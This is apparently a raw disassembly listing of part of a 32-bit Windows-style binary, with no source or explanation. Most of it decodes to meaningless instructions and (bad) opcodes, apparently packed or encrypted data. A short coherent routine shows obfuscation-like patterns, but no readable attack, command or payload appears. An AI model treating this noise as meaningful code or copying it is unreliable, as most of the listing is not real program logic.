  40d329:	add    al,BYTE PTR [eax]
  40d32b:	add    BYTE PTR [ebx-0x4cd54cfa],bl
  40d331:	stos   DWORD PTR es:[edi],eax
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	adc    al,0x9c
  40d33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d33b:	jl     0x40d2ed
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	jmp    0xbff0:0x7c5ca6fb
  40d34b:	cld    
  40d34c:	xor    al,0x37
  40d34e:	dec    edx
  40d34f:	jo     0x40d2ea
  40d351:	mov    ah,0xf2
  40d353:	push   ebp
  40d354:	das    
  40d355:	das    
  40d356:	adc    eax,0xcf200d84
  40d35b:	loop   0x40d3c6
  40d35d:	(bad)  
  40d35e:	cld    
  40d35f:	adc    ecx,DWORD PTR [ebp-0x1664b8e0]
  40d365:	jb     0x40d3cb
  40d367:	test   eax,0xc9b8f97d
  40d36c:	inc    esp
  40d36d:	fs and eax,0x6544bf1b
  40d373:	pop    esp
  40d374:	mov    fs,edx
  40d376:	xor    bh,ch
  40d378:	inc    ebp
  40d379:	test   BYTE PTR [ecx],bh
  40d37b:	(bad)  
  40d37c:	out    0x78,eax
  40d37e:	mov    ecx,0x3a3556ca
  40d383:	sbb    al,0x1f
  40d385:	mov    al,ds:0x612d92a6
  40d38a:	sbb    bh,dh
  40d38c:	add    BYTE PTR [ebp+0x1],al
  40d38f:	mov    bl,0x1b
  40d391:	int3   
  40d392:	test   BYTE PTR [edi],dl
  40d394:	dec    esi
  40d395:	dec    ebx
  40d396:	mov    al,0x7f
  40d398:	mov    eax,0x1674c5da
  40d39d:	clc    
  40d39e:	xchg   esp,eax
  40d39f:	fisttp WORD PTR [ebp+0x667ebff8]
  40d3a5:	test   ebp,0xb18edf5e
  40d3ab:	(bad)  
  40d3ac:	call   0x22f7d64f
  40d3b1:	daa    
  40d3b2:	xchg   ebx,eax
  40d3b3:	loopne 0x40d388
  40d3b5:	dec    ecx
  40d3b6:	mov    esi,0x9d14ded9
  40d3bb:	cmp    al,0xb9
  40d3bd:	pop    es
  40d3be:	je     0x40d3da
  40d3c0:	mov    bh,0x1c
  40d3c2:	dec    eax
  40d3c3:	and    cl,BYTE PTR [esi]
  40d3c5:	into   
  40d3c6:	je     0x40d369
  40d3c8:	inc    ebx
  40d3c9:	in     al,0x4c
  40d3cb:	mov    ch,al
  40d3cd:	dec    ebp
  40d3ce:	xchg   ebp,eax
  40d3cf:	rcl    DWORD PTR [edi],1
  40d3d1:	add    al,cl
  40d3d3:	inc    eax
  40d3d4:	ror    BYTE PTR [ebp+0x6e2f632a],0xeb
  40d3db:	pop    edx
  40d3dc:	jle    0x40d390
  40d3de:	mov    ebx,0xc46f489d
  40d3e3:	mov    al,ds:0x6f4d6f41
  40d3e8:	mul    DWORD PTR [ebx+esi*2+0x63]
  40d3ec:	jnp    0x40d3fc
  40d3ee:	mov    ebp,0xb5c0c800
  40d3f3:	cmp    BYTE PTR [esi+ebx*4-0x210ea948],0x29
  40d3fb:	pop    edx
  40d3fc:	lods   al,BYTE PTR ds:[esi]
  40d3fd:	fcomp  QWORD PTR [ebp+0x2]
  40d400:	cld    
  40d401:	xchg   ecx,eax
  40d402:	mov    ecx,0x97fcee98
  40d407:	push   es
  40d408:	fstp   st(1)
  40d40a:	push   eax
  40d40b:	fst    DWORD PTR [edx-0x6b]
  40d40e:	ins    DWORD PTR es:[edi],dx
  40d40f:	or     al,0x77
  40d411:	pop    ecx
  40d412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d413:	xchg   ecx,eax
  40d414:	into   
  40d415:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d417:	arpl   WORD PTR [edx+0x2c],ax
  40d41a:	pop    eax
  40d41b:	adc    DWORD PTR [edx-0x170c85dd],ebx
  40d421:	das    
  40d422:	cmc    
  40d423:	js     0x40d445
  40d425:	add    BYTE PTR [esi+esi*4-0x3e],ch
  40d429:	call   0x5ba6:0xb6e535e1
  40d430:	ds ret 0x1b4c
  40d434:	bound  esp,QWORD PTR [ecx]
  40d436:	aad    0x66
  40d438:	fdivr  DWORD PTR [eax]
  40d43a:	mov    eax,0xe1c85cce
  40d43f:	mov    cl,0x52
  40d441:	sub    BYTE PTR [ebx],ah
  40d443:	nop
  40d444:	or     DWORD PTR [ebx-0x4c],edx
  40d447:	mov    ch,0xf0
  40d449:	xlat   BYTE PTR ds:[ebx]
  40d44a:	pop    esp
  40d44b:	xchg   edi,eax
  40d44c:	push   edi
  40d44d:	mov    bl,0x20
  40d44f:	test   DWORD PTR [eax+eax*1+0x7959d152],edx
  40d456:	div    BYTE PTR [ebx-0x27]
  40d459:	xchg   esi,eax
  40d45a:	add    DWORD PTR [eax+esi*1-0x7c],eax
  40d45e:	fwait
  40d45f:	sub    BYTE PTR [esi],cl
  40d461:	(bad)  
  40d462:	neg    BYTE PTR [edx+0x48]
  40d465:	cwde   
  40d466:	outs   dx,BYTE PTR ds:[esi]
  40d467:	xchg   edx,eax
  40d468:	fs and ebx,ebx
  40d46b:	mov    bh,0xc4
  40d46d:	or     DWORD PTR ds:0x3357107f,edi
  40d473:	pop    ss
  40d474:	add    eax,0x585f1ead
  40d479:	mov    ecx,0x6bb4392b
  40d47e:	iret   
  40d47f:	dec    eax
  40d480:	nop
  40d481:	dec    ebp
  40d482:	mov    ds:0x9d46e11b,eax
  40d487:	jecxz  0x40d458
  40d489:	out    dx,al
  40d48a:	rcl    DWORD PTR [ebx+0x31],cl
  40d48d:	mov    dl,0x18
  40d48f:	mov    ah,0x86
  40d491:	(bad)  
  40d492:	cmp    ch,bl
  40d494:	fnstsw WORD PTR [ecx+0x3c]
  40d497:	pop    edx
  40d498:	rcl    cl,cl
  40d49a:	cld    
  40d49b:	jae    0x40d495
  40d49d:	mov    ds,WORD PTR [edi]
  40d49f:	scas   al,BYTE PTR es:[edi]
  40d4a0:	fmulp  st(7),st
  40d4a2:	and    cl,BYTE PTR [edi+0xf]
  40d4a5:	ja     0x40d4cd
  40d4a7:	test   al,0x96
  40d4a9:	loop   0x40d524
  40d4ab:	push   0x69a09377
  40d4b0:	pop    esi
  40d4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4b2:	jae    0x40d50f
  40d4b4:	or     esp,DWORD PTR [edx+ebx*8-0x4a]
  40d4b8:	inc    edi
  40d4b9:	mov    edi,0x4825374c
  40d4be:	add    ebp,esp
  40d4c0:	xchg   BYTE PTR [ebx],bl
  40d4c2:	xor    al,0x2f
  40d4c4:	popa   
  40d4c5:	xlat   BYTE PTR ds:[ebx]
  40d4c6:	inc    edx
  40d4c7:	mov    ds:0x1d5a14fd,eax
  40d4cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4cd:	jmp    0x40d53f
  40d4cf:	ret    
  40d4d0:	inc    BYTE PTR [edi]
  40d4d2:	add    eax,0x4ad541fa
  40d4d7:	xlat   BYTE PTR ds:[ebx]
  40d4d8:	data16 add ch,al
  40d4db:	pop    ebx
  40d4dc:	dec    esp
  40d4dd:	and    eax,0x8cc999e8
  40d4e2:	and    BYTE PTR [edx],ch
  40d4e4:	mov    ebp,0x514b2c81
  40d4e9:	xchg   eax,esp
  40d4eb:	pop    ebp
  40d4ec:	sbb    al,0x50
  40d4ee:	iret   
  40d4ef:	dec    edx
  40d4f0:	int3   
  40d4f1:	jnp    0x40d49c
  40d4f3:	stos   BYTE PTR es:[edi],al
  40d4f4:	pop    edi
  40d4f5:	fbld   TBYTE PTR [ebp-0x56]
  40d4f8:	dec    edi
  40d4f9:	inc    esi
  40d4fa:	ss ja  0x40d50d
  40d4fd:	mov    ecx,0xc1dbbf65
  40d502:	aaa    
  40d503:	sub    DWORD PTR [ebp+0x474693cc],ebx
  40d509:	clc    
  40d50a:	and    DWORD PTR [ecx+esi*2-0x37],esi
  40d50e:	mov    esi,esi
  40d510:	push   edx
  40d511:	in     eax,dx
  40d512:	xor    al,dh
  40d514:	lods   eax,DWORD PTR ds:[esi]
  40d515:	jns    0x40d514
  40d517:	jg     0x40d55d
  40d519:	fild   QWORD PTR [ecx]
  40d51b:	lock add al,0xbe
  40d51e:	popa   
  40d51f:	push   0x5c
  40d521:	jl     0x40d584
  40d523:	mov    ecx,0x233d9469
  40d528:	xor    esp,DWORD PTR [ecx]
  40d52a:	mov    edi,0xf9ccdf1a
  40d52f:	stos   DWORD PTR es:[edi],eax
  40d530:	and    eax,0x80ba3316
  40d535:	jns    0x40d4e7
  40d537:	mov    ebx,0x3f9308a2
  40d53c:	xchg   ebp,eax
  40d53d:	sahf   
  40d53e:	or     dl,dh
  40d540:	fidivr DWORD PTR [ebx]
  40d542:	jns    0x40d4f0
  40d544:	pop    ebx
  40d545:	repnz out 0xae,eax
  40d548:	loopne 0x40d5c6
  40d54a:	ret    0xe569
  40d54d:	test   al,0xfc
  40d54f:	dec    edi
  40d550:	xchg   eax,esi
  40d552:	test   BYTE PTR ds:0x3f11ed6f,al
  40d558:	sbb    edi,DWORD PTR [ecx+ecx*8]
  40d55b:	imul   ebp,esi,0x7c
  40d55e:	comiss xmm2,DWORD PTR [ebx-0x60cef919]
  40d565:	add    BYTE PTR [eax+0x12c2484e],bl
  40d56b:	neg    DWORD PTR [esi+ecx*2-0x47be2819]
  40d572:	mov    fs,WORD PTR [edx+ecx*2]
  40d575:	jbe    0x40d5e0
  40d577:	in     eax,0xc7
  40d579:	jp     0x40d537
  40d57b:	ss pop esp
  40d57d:	add    ebp,edx
  40d57f:	loop   0x40d5ef
  40d581:	in     al,dx
  40d582:	rcl    cl,0x4c
  40d585:	jge    0x40d5cd
  40d587:	jnp    0x40d56e
  40d589:	mov    bl,0x43
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433823,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433817,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43381b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433827,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433863
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43381b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4338a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4338af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4337db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43385b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433897,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433897
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433897,edx
  40d64f:	cmp    DWORD PTR ds:0x433897,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433897,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4337e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4337e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4337e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4337e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4338d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4337e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4337e7
  40d6b7:	add    eax,DWORD PTR ds:0x43381b
  40d6bd:	mov    ds:0x4337e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x54a0482a
  40d6f9:	lock fidivr DWORD PTR [edx+edi*2+0x3e7e7e92]
  40d701:	jl     0x40d781
  40d703:	jle    0x40d756
  40d705:	mov    ds:0x1bdd68fb,al
  40d70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d70b:	or     cl,BYTE PTR [ebx]
  40d70d:	cli    
  40d70e:	ret    
  40d70f:	fdiv   DWORD PTR [ebx]
  40d711:	(bad)  
  40d712:	mov    bl,0x52
  40d714:	mov    ah,0xc9
  40d716:	cmp    eax,0xf38d6b
  40d71b:	adc    dl,BYTE PTR [ebp+0x4ccddd49]
  40d721:	lods   eax,DWORD PTR ds:[esi]
  40d722:	or     edx,DWORD PTR [eax+0xb104c79]
  40d728:	aaa    
  40d729:	lds    edx,FWORD PTR [eax]
  40d72b:	jae    0x40d77a
  40d72d:	dec    dx
  40d72f:	aaa    
  40d730:	cs mov esp,0xe5c8a99e
  40d736:	and    DWORD PTR ds:0xb006db2c,eax
  40d73c:	and    al,0xe9
  40d73e:	inc    ecx
  40d73f:	icebp  
  40d740:	outs   dx,DWORD PTR ds:[esi]
  40d741:	xchg   esi,eax
  40d742:	adc    DWORD PTR ds:0xbfccfd34,ebp
  40d748:	imul   ecx,DWORD PTR [ecx-0x5d2ef664],0x14
  40d74f:	pushf  
  40d750:	inc    edi
  40d751:	mov    ds:0xedb30382,eax
  40d756:	adc    DWORD PTR [esi],edi
  40d758:	scas   eax,DWORD PTR es:[edi]
  40d759:	aas    
  40d75a:	fisub  DWORD PTR [eax+eax*1+0x383ca617]
  40d761:	outs   dx,DWORD PTR ds:[esi]
  40d762:	xchg   ecx,eax
  40d763:	mov    bl,0x89
  40d765:	pop    ebp
  40d766:	jmp    0x7c947a5
  40d76b:	into   
  40d76c:	aaa    
  40d76d:	add    eax,0x8b014737
  40d772:	or     cl,BYTE PTR [ecx+0x1f]
  40d775:	dec    eax
  40d776:	cli    
  40d777:	jp     0x40d7e8
  40d779:	mov    ebx,0xfe5ec810
  40d77e:	call   DWORD PTR [ecx+0x2062d046]
  40d784:	cmovne ebp,DWORD PTR [edx+eiz*1-0xc]
  40d789:	mov    eax,ds:0xad676ff1
  40d78e:	clc    
  40d78f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40d791:	push   0xffffffe9
  40d793:	sbb    al,0xfd
  40d795:	lock dec esi
  40d797:	lds    eax,FWORD PTR [eax+0x2e]
  40d79a:	cmp    BYTE PTR [ecx-0x56f7d10e],cl
  40d7a0:	jmp    0x40d820
  40d7a2:	aad    0x0
  40d7a4:	mov    ecx,0x9d2dad71
  40d7a9:	mov    ebx,0x3902156d
  40d7ae:	push   es
  40d7af:	daa    
  40d7b0:	sub    BYTE PTR [edx],al
  40d7b2:	stos   BYTE PTR es:[edi],al
  40d7b3:	leave  
  40d7b4:	push   esi
  40d7b5:	das    
  40d7b6:	jl     0x40d7df
  40d7b8:	ror    DWORD PTR [ebx+0x53f613ec],0x98
  40d7bf:	outs   dx,BYTE PTR ds:[esi]
  40d7c0:	retf   
  40d7c1:	add    esi,DWORD PTR [ebx+ebx*1]
  40d7c4:	xchg   edi,eax
  40d7c5:	sbb    dh,ch
  40d7c7:	pop    esi
  40d7c8:	and    DWORD PTR [ebp+edi*2+0x69054f94],ebp
  40d7cf:	inc    esp
  40d7d0:	add    DWORD PTR [ebx-0x5f],esi
  40d7d3:	shr    bl,1
  40d7d5:	mov    eax,ds:0xb0ff5398
  40d7da:	adc    al,0xfd
  40d7dc:	ret    0xb23b
  40d7df:	xor    DWORD PTR [ecx],edx
  40d7e1:	mov    ecx,DWORD PTR [ebx+0x470cf09]
  40d7e7:	or     eax,0x8716254b
  40d7ec:	lea    esi,[ecx-0x59befaae]
  40d7f2:	push   es
  40d7f3:	mov    esi,0xd576d0b
  40d7f8:	inc    ecx
  40d7fa:	mov    WORD PTR [ebp-0x7c],es
  40d7fd:	mov    ds:0xf618d5d1,eax
  40d802:	dec    eax
  40d803:	ds inc esi
  40d805:	dec    ebp
  40d806:	sbb    BYTE PTR [esi+eiz*8-0x4f],dl
  40d80a:	mov    ebx,0x58456c48
  40d80f:	das    
  40d810:	aas    
  40d811:	add    BYTE PTR [edi+edx*2+0x5],cl
  40d815:	or     BYTE PTR [ecx+0xb],dl
  40d818:	pop    ds
  40d819:	pop    edi
  40d81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d81b:	pop    esi
  40d81c:	mov    esi,es
  40d81e:	sbb    BYTE PTR [ebp-0x51],dh
  40d821:	push   eax
  40d822:	and    BYTE PTR [ebx+0x2],ch
  40d825:	(bad)  
  40d826:	and    BYTE PTR [esi-0x102fc7a2],al
  40d82c:	push   ds
  40d82d:	add    eax,0xfd25ceb1
  40d832:	inc    eax
  40d833:	adc    bh,BYTE PTR [ebx]
  40d835:	push   edx
  40d836:	lahf   
  40d837:	(bad)  
  40d838:	nop
  40d839:	mul    DWORD PTR [edi+0x54]
  40d83c:	imul   BYTE PTR [ebp-0x26]
  40d83f:	mov    esi,0x104e5684
  40d844:	add    ch,BYTE PTR [edi]
  40d846:	loope  0x40d7cd
  40d848:	in     al,dx
  40d849:	out    0x56,al
  40d84b:	out    0xa6,al
  40d84d:	not    eax
  40d84f:	test   eax,0xcc1c8139
  40d854:	popf   
  40d855:	sahf   
  40d856:	repz xchg ebx,eax
  40d858:	jmp    0x3ee2:0xe5170315
  40d85f:	push   ss
  40d860:	cmc    
  40d861:	jns    0x40d89e
  40d863:	push   ecx
  40d864:	test   ecx,eax
  40d866:	retf   0x7c3a
  40d869:	jbe    0x40d815
  40d86b:	adc    al,0xa9
  40d86d:	add    eax,0xa22d6f00
  40d872:	in     eax,0xf7
  40d874:	or     al,0x60
  40d876:	and    eax,0x9443875a
  40d87b:	dec    ebx
  40d87c:	add    eax,0xf3f503cb
  40d881:	test   DWORD PTR [edx],edi
  40d883:	not    dl
  40d885:	sbb    ch,dh
  40d887:	fs jp  0x40d88f
  40d88a:	es jmp 0x2e4a9f1f
  40d890:	jecxz  0x40d8a7
  40d892:	pop    ebx
  40d893:	out    0xea,al
  40d895:	sbb    bh,ah
  40d897:	xchg   ebx,eax
  40d898:	fbstp  TBYTE PTR [esi+0x392abef]
  40d89e:	sub    eax,0x10acf587
  40d8a3:	cs pop eax
  40d8a5:	test   DWORD PTR ds:0x44ed0a1f,0xcbc4ec29
  40d8af:	test   al,ah
  40d8b1:	in     al,0xe3
  40d8b3:	popa   
  40d8b4:	pop    edi
  40d8b5:	(bad)  
  40d8b6:	push   cs
  40d8b7:	(bad)  
  40d8b8:	or     eax,0x87655575
  40d8bd:	or     al,0xac
  40d8bf:	aad    0x4d
  40d8c1:	mov    esi,0xaca465c6
  40d8c6:	cmp    BYTE PTR [ebx+0x50752cc8],0xfe
  40d8cd:	dec    edx
  40d8ce:	cmc    
  40d8cf:	xor    esp,edi
  40d8d1:	stos   DWORD PTR es:[edi],eax
  40d8d2:	adc    cl,dl
  40d8d4:	cdq    
  40d8d5:	cdq    
  40d8d6:	inc    edi
  40d8d7:	loopne 0x40d945
  40d8d9:	mov    ds:0x5ed6886e,al
  40d8de:	inc    ebx
  40d8df:	xor    DWORD PTR [edi+edi*4],0xffffff80
  40d8e3:	imul   edx,DWORD PTR [edx+ecx*8],0x6e
  40d8e7:	dec    edx
  40d8e8:	leave  
  40d8e9:	loop   0x40d8b0
  40d8eb:	push   ebp
  40d8ec:	xor    BYTE PTR [ebx],bl
  40d8ee:	dec    BYTE PTR [ebx+0x51ddaa95]
  40d8f4:	loopne 0x40d8eb
  40d8f6:	mov    al,BYTE PTR [edx]
  40d8f8:	mov    ebx,0x3317c4e2
  40d8fd:	and    cl,BYTE PTR [ebp-0x7a830073]
  40d903:	dec    cl
  40d905:	push   edx
  40d906:	pop    edx
  40d907:	inc    ebp
  40d908:	adc    al,0x51
  40d90a:	(bad)  [ebx+0x279cd279]
  40d910:	jb     0x40d90b
  40d912:	out    dx,al
  40d913:	sahf   
  40d914:	mov    esp,0x202757a4
  40d919:	or     BYTE PTR [ebx+0x6e],bh
  40d91c:	inc    esp
  40d91d:	fucomi st,st(4)
  40d91f:	ins    DWORD PTR es:[edi],dx
  40d920:	aaa    
  40d921:	test   BYTE PTR [ebx],ah
  40d923:	(bad)  
  40d925:	fdivp  st(3),st
  40d927:	mov    al,ds:0xe95e0d11
  40d92c:	ret    
  40d92d:	scas   eax,DWORD PTR es:[edi]
  40d92e:	adc    al,0x32
  40d930:	aad    0x61
  40d932:	fdiv   QWORD PTR [ecx-0x2559fc7f]
  40d938:	test   BYTE PTR [edx-0x70],bl
  40d93b:	pop    ds
  40d93c:	push   ds
  40d93d:	cmp    bl,BYTE PTR [edx]
  40d93f:	arpl   WORD PTR [ecx+eax*4+0x6a],bp
  40d943:	sub    cl,BYTE PTR [ecx-0x7ba74ff]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xa12b51ed
  40d96a:	in     al,0xd3
  40d96c:	inc    edi
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	neg    BYTE PTR [edi+esi*1-0x4d99663f]
  40d97c:	mov    esi,es
  40d97e:	mov    ch,0xcd
  40d980:	push   es
  40d981:	inc    ebx
  40d982:	mov    ch,0xd2
  40d984:	in     al,dx
  40d985:	repnz stos DWORD PTR es:[edi],eax
  40d987:	or     bl,al
  40d989:	mov    dl,0xb
  40d98b:	push   edi
  40d98c:	add    BYTE PTR [ebp+0x2f979333],ch
  40d992:	fs lock push esi
  40d995:	xlat   BYTE PTR ds:[ebx]
  40d996:	repnz pushf 
  40d998:	mov    ebp,0x19cc51b2
  40d99d:	into   
  40d99e:	mov    eax,ds:0x5b4c59ec
  40d9a3:	stos   DWORD PTR es:[edi],eax
  40d9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a5:	std    
  40d9a6:	adc    ebp,DWORD PTR [esi+0x57085c87]
  40d9ac:	rcr    DWORD PTR [eax+0x6c],0xcf
  40d9b0:	and    eax,0x65518b7
  40d9b5:	xor    BYTE PTR [edi-0x2c],dl
  40d9b8:	push   ecx
  40d9b9:	mov    bh,al
  40d9bb:	popw   ss
  40d9bd:	(bad)  
  40d9be:	cdq    
  40d9bf:	sti    
  40d9c0:	sbb    ebp,DWORD PTR [ecx]
  40d9c2:	push   eax
  40d9c3:	jb     0x40d97e
  40d9c5:	inc    ebp
  40d9c6:	adc    DWORD PTR [ebx-0x3b],eax
  40d9c9:	inc    ebx
  40d9ca:	outs   dx,DWORD PTR ds:[esi]
  40d9cb:	lock dec ecx
  40d9cd:	mov    esi,0x852e8747
  40d9d2:	dec    esi
  40d9d3:	xchg   ebp,eax
  40d9d4:	push   es
  40d9d5:	fmul   st(2),st
  40d9d7:	ins    BYTE PTR es:[edi],dx
  40d9d8:	jle    0x40d992
  40d9da:	neg    esi
  40d9dc:	xchg   ecx,eax
  40d9dd:	inc    ecx
  40d9de:	mov    BYTE PTR [ecx+eax*8-0x3c],dh
  40d9e2:	(bad)  
  40d9e3:	ficom  DWORD PTR [edx+0x34880c47]
  40d9e9:	int3   
  40d9ea:	and    BYTE PTR [edx-0x71460f4e],dh
  40d9f0:	sub    DWORD PTR [ebp-0x223e77f2],ebp
  40d9f6:	adc    BYTE PTR [ebx-0x34],0x40
  40d9fa:	ins    BYTE PTR es:[edi],dx
  40d9fb:	jp     0x40d9d8
  40d9fd:	xor    al,0x4e
  40d9ff:	and    ch,ch
  40da01:	inc    esp
  40da02:	fidivr DWORD PTR [ecx]
  40da04:	mov    ds:0xd9aa713e,al
  40da09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0a:	shl    BYTE PTR [edi+0x59543f4d],cl
  40da10:	inc    edi
  40da11:	sub    al,BYTE PTR [esi+0x7ec59fca]
  40da17:	out    dx,eax
  40da18:	adc    bl,ah
  40da1a:	imul   esp,DWORD PTR [ebp-0x35b4437f],0xffffffdc
  40da21:	mov    ds:0x4a9ed98f,al
  40da26:	or     eax,0x1c1495d0
  40da2b:	lds    esi,FWORD PTR [ecx]
  40da2d:	jl     0x40da2c
  40da2f:	add    al,0x74
  40da31:	scas   eax,DWORD PTR es:[edi]
  40da32:	into   
  40da33:	and    DWORD PTR [edx+0x41e63075],ebx
  40da39:	cs hlt 
  40da3b:	out    0x84,al
  40da3d:	aad    0xe
  40da3f:	lock sbb ebx,DWORD PTR [edx+eiz*4-0x6db0d6c7]
  40da47:	mov    al,ds:0xadcb8bd8
  40da4c:	pop    ebp
  40da4d:	out    0x80,eax
  40da4f:	add    eax,0xaee47cfa
  40da54:	pop    ebx
  40da55:	push   0xd69ffa2d
  40da5a:	repz sbb eax,0xf83166ca
  40da60:	xor    ah,0x1a
  40da63:	jne    0x40dacd
  40da65:	inc    ecx
  40da66:	sbb    DWORD PTR [ebp-0x6e],esi
  40da69:	or     DWORD PTR [ecx+ebp*2-0xfba7333],eax
  40da70:	jns    0x40da31
  40da72:	rol    DWORD PTR [ebp+0x2b],cl
  40da75:	data16 jnp 0x40da7c
  40da78:	inc    eax
  40da79:	ror    DWORD PTR [esi-0x6281d559],cl
  40da7f:	jmp    0x34f2c6a9
  40da84:	out    dx,al
  40da85:	sub    BYTE PTR [si],0x13
  40da89:	pop    ebp
  40da8a:	cld    
  40da8b:	mov    al,ds:0x9128a821
  40da90:	ins    BYTE PTR es:[edi],dx
  40da91:	pop    ecx
  40da92:	push   esi
  40da93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da94:	xor    bl,BYTE PTR [esp+ebp*8-0x302faed7]
  40da9b:	loop   0x40dac6
  40da9d:	jp     0x40da6f
  40da9f:	mov    esp,cr7
  40daa2:	(bad)  
  40daa4:	jb     0x40da66
  40daa6:	in     eax,0x94
  40daa8:	xlat   BYTE PTR ds:[ebx]
  40daa9:	fdiv   DWORD PTR [ecx-0x6fdaf2c1]
  40daaf:	lods   al,BYTE PTR ds:[esi]
  40dab0:	loop   0x40da64
  40dab2:	adc    BYTE PTR [esi-0xd],dh
  40dab5:	dec    esp
  40dab6:	cmp    BYTE PTR [ebx],dh
  40dab8:	(bad)  [edi]
  40daba:	(bad)  
  40dabb:	sbb    BYTE PTR [ebp+0x56],0x53
  40dabf:	sbb    ch,BYTE PTR [esp+edi*4-0x5899dbdd]
  40dac6:	sti    
  40dac7:	pop    esi
  40dac8:	stos   DWORD PTR es:[edi],eax
  40dac9:	lods   eax,DWORD PTR ds:[esi]
  40daca:	retf   0xdc52
  40dacd:	xchg   ecx,eax
  40dace:	adc    esp,edi
  40dad0:	es xchg ebp,eax
  40dad2:	sbb    BYTE PTR [edx],dl
  40dad4:	fs js  0x40db24
  40dad7:	add    ecx,0xe2e60bce
  40dadd:	out    dx,al
  40dade:	mov    ebx,0xb4982f58
  40dae3:	adc    dh,BYTE PTR [ebx-0x30d7e53e]
  40dae9:	bound  edi,QWORD PTR [edx+eax*4-0x5b]
  40daed:	inc    eax
  40daee:	xor    al,0x6b
  40daf0:	inc    ecx
  40daf1:	lahf   
  40daf2:	outs   dx,BYTE PTR ds:[esi]
  40daf3:	cli    
  40daf4:	mov    al,0x34
  40daf6:	dec    ebx
  40daf7:	pop    es
  40daf8:	leave  
  40daf9:	sbb    al,0xc2
  40dafb:	ja     0x40dadc
  40dafd:	out    0xa3,eax
  40daff:	mov    BYTE PTR [edi+esi*2+0x18],cl
  40db03:	add    DWORD PTR [ebx+0x62],edi
  40db06:	psubb  mm3,QWORD PTR [ebx]
  40db09:	into   
  40db0a:	lods   eax,DWORD PTR ds:[esi]
  40db0b:	mov    ds:0x643c090d,al
  40db10:	jecxz  0x40db90
  40db12:	les    ecx,FWORD PTR [ebp-0x6913a73d]
  40db18:	pop    ss
  40db19:	mov    ecx,0x8a718b55
  40db1e:	mov    ebp,ebp
  40db20:	ret    0xe559
  40db23:	js     0x40db8f
  40db25:	test   edx,ebp
